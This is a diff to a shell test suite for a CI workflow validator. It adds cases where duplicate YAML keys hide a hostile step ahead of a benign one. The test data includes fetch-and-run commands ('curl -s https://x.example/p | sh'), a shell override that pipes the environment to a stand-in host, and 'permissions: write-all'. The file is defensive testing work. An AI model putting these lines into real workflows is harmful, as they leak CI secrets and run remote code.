@@ -512,6 +512,12 @@ caught "AC1 second job" '    steps:' '    steps: []\n  other:\n    runs-on: ubun
 caught "AC3 workflow-level defaults.run.shell reroutes every run step (leaks the token variables)" 'permissions:\n  contents: read\njobs' "defaults:\n  run:\n    shell: \"bash -c 'env | curl -d @- https://x.example; bash {0}'\"\npermissions:\n  contents: read\njobs"
 caught "AC3 workflow-level concurrency" 'permissions:\n  contents: read\njobs' "concurrency: x\npermissions:\n  contents: read\njobs"
 caught "AC3 workflow-level run-name" 'permissions:\n  contents: read\njobs' "run-name: x\npermissions:\n  contents: read\njobs"
+# Duplicate keys (Codex #249 r4 B3a): a reader that keeps only the LAST of two equal keys judges the benign one, so the
+# judge must refuse any mapping that repeats a key (step, job and top level), never pick one.
+caught "AC1 a step with two run: keys (the second the benign sign line)" "      $SIGNLINE" "      run: curl -s https://x.example/p | sh\n        $SIGNLINE"
+caught "AC1 a job with two permissions: keys (the second the benign one)" '    permissions:\n      contents: read\n      id-token: write' '    permissions: write-all\n    permissions:\n      contents: read\n      id-token: write'
+caught "AC1 two top-level permissions: keys (the second the benign one)" 'permissions:\n  contents: read\njobs' "permissions: write-all\npermissions:\n  contents: read\njobs"
+caught "AC1 two top-level on: keys (the second the benign workflow_call)" '\non:' "\non: push\non:"
 caught "AC1 job runs in a container" 'runs-on: ubuntu-24.04' 'runs-on: ubuntu-24.04\n    container: alpine'
 caught "AC2 extra input" 'digests:\n        description' 'script:\n        type: string\n      digests:\n        description'
 caught "AC2 downloads another artifact" 'name: witness-build' 'name: dist'
@@ -1069,6 +1075,44 @@ jobs:
           x: y
         run: bash bin/build-stage.sh a
 EOF
+ycase y_dup_ctl "control for the duplicate-key cases: one listed run step" ok <<'EOF'
+jobs:
+  j:
+    runs-on: ubuntu-24.04
+    steps:
+      - run: bash bin/build-stage.sh a
+EOF
+ycase y_dup_run "a step with two run: keys, the second a listed script (Codex #249 r4 B3a)" <<'EOF'
+jobs:
+  j:
+    runs-on: ubuntu-24.04
+    steps:
+      - run: curl -s https://x.example/p | sh
+        run: bash bin/build-stage.sh a
+EOF
+ycase y_dup_job "a job repeated under jobs:, the second the benign one (Codex #249 r4 B3a)" <<'EOF'
+jobs:
+  j:
+    runs-on: ubuntu-24.04
+    steps:
+      - run: curl -s https://x.example/p | sh
+  j:
+    runs-on: ubuntu-24.04
+    steps:
+      - run: bash bin/build-stage.sh a
+EOF
+ycase y_dup_top "two top-level jobs: keys, the second the benign one (Codex #249 r4 B3a)" <<'EOF'
+jobs:
+  j:
+    runs-on: ubuntu-24.04
+    steps:
+      - run: curl -s https://x.example/p | sh
+jobs:
+  j:
+    runs-on: ubuntu-24.04
+    steps:
+      - run: bash bin/build-stage.sh a
+EOF
 # listed scripts: the text scan (Sonnet blocker 2, Opus B6/B7)
 S1='#!/usr/bin/env bash\nset -euo pipefail\nwitness run -- bin/build-apk.sh\n'
 scriptcase s_if caught "${S1}if curl evil.example; then :; fi\n" '' "if curl (a keyword before the command, Sonnet 2)"
@@ -1426,7 +1470,7 @@ if [ "$ok_n" = 1 ]; then pass=$((pass + 1)); echo "ok   with legacy-stage-files.
 g="$work/gitcopy"; rm -rf "$g"; cp -R "$REAL" "$g"; ( cd "$g" && git init -q . && git add -A && git -c user.name=t -c user.email=t@t -c commit.gpgsign=false commit -qm c )
 printf 'cosign attest --type slsaprovenance x\n' > "$g/bin/untracked-signer.sh"
 expect ok "an UNTRACKED file holding a signer is not in the tracked copy CI judges" tree "$(tracked_copy fromgit "$g")"
-EXPECT=329
+EXPECT=337
 echo "pass=$pass fail=$failn"
 if [ $((pass + failn)) != "$EXPECT" ]; then echo "FAIL case count $((pass + failn)) != expected $EXPECT (a case was skipped or added)"; exit 1; fi
 [ "$failn" = 0 ]
